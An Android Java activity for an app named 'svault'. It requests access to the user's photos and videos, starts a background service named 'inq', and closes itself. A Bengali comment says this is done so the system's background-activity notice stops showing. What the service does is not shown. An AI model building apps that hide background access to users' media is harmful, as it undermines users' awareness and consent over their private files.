package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQ = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        askPermissions();
    }

    @SuppressWarnings("NewApi")
    private void askPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] p = {
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.POST_NOTIFICATIONS
            };
            boolean all = true;
            for (String s : p)
                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) { all = false; break; }
            if (!all) requestPermissions(p, REQ); else launch();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED)
                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ);
            else launch();
        } else {
            launch();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ) return;
        for (int i = 0; i < perms.length; i++) {
            if (results[i] == PackageManager.PERMISSION_GRANTED
                    && (perms[i].equals(Manifest.permission.READ_MEDIA_IMAGES)
                     || perms[i].equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                launch(); return;
            }
        }
        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
        finish();
    }

    private void launch() {
        startService(new Intent(this, inq.class));
        finish(); // Activity শেষ — "1 active in background" আর দেখাবে না
    }
}
